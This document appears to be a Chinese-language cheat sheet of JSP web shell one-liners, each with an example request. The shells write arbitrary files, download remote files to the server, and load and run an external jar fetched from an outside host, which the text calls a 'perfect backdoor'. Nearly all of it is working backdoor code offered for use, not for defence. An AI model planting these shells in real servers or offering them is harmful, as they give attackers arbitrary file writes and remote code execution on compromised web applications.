###把字符串编码后写入指定文件的：

1.1

    <%new java.io.FileOutputStream(request.getParameter("f")).write(request.getParameter("c").getBytes());%>

请求：http://localhost:8080/Shell/file.jsp?f=/Users/yz/wwwroot/2.txt&c=1234

写入web目录：

1.2

    <%new java.io.FileOutputStream(application.getRealPath("/")+"/"+request.getParameter("f")).write(request.getParameter("c").getBytes());%>

请求：http://localhost:8080/Shell/file.jsp?f=2.txt&c=1234

2.1

    <%new java.io.RandomAccessFile(request.getParameter("f"),"rw").write(request.getParameter("c").getBytes()); %>

请求：http://localhost:8080/Shell/file.jsp?f=/Users/yz/wwwroot/2.txt&c=1234

写入web目录:

2.2

    <%new java.io.RandomAccessFile(application.getRealPath("/")+"/"+request.getParameter("f"),"rw").write(request.getParameter("c").getBytes()); %>
    
请求：http://localhost:8080/Shell/file.jsp?f=2.txt&c=1234

###下载远程文件(不用apache io utils的话没办法把inputstream转byte,所以很长…)

    <%
        java.io.InputStream in = new java.net.URL(request.getParameter("u")).openStream();
        byte[] b = new byte[1024];
        java.io.ByteArrayOutputStream baos = new java.io.ByteArrayOutputStream();
        int a = -1;
        while ((a = in.read(b)) != -1) {
            baos.write(b, 0, a);
        }
        new java.io.FileOutputStream(request.getParameter("f")).write(baos.toByteArray());
    %>

请求：http://localhost:8080/Shell/download.jsp?f=/Users/yz/wwwroot/1.png&u=http://www.baidu.com/img/bdlogo.png

下载到web路径:

    <%
        java.io.InputStream in = new java.net.URL(request.getParameter("u")).openStream();
        byte[] b = new byte[1024];
        java.io.ByteArrayOutputStream baos = new java.io.ByteArrayOutputStream();
        int a = -1;
        while ((a = in.read(b)) != -1) {
            baos.write(b, 0, a);
        }
        new java.io.FileOutputStream(application.getRealPath("/")+"/"+ request.getParameter("f")).write(baos.toByteArray());
    %>

请求：http://localhost:8080/Shell/download.jsp?f=1.png&u=http://www.baidu.com/img/bdlogo.png

###反射调用外部jar,完美后门

如果嫌弃上面的后门功能太弱太陈旧可以试试这个：

    <%=Class.forName("Load",true,new java.net.URLClassLoader(new java.net.URL[]{new java.net.URL(request.getParameter("u"))})).getMethods()[0].invoke(null, new Object[]{request.getParameterMap()})%>

请求：http://192.168.16.240:8080/Shell/reflect.jsp?u=http://p2j.cn/Cat.jar&023=A


详情：[p2j.cn](http://javaweb.org/?p=1627)
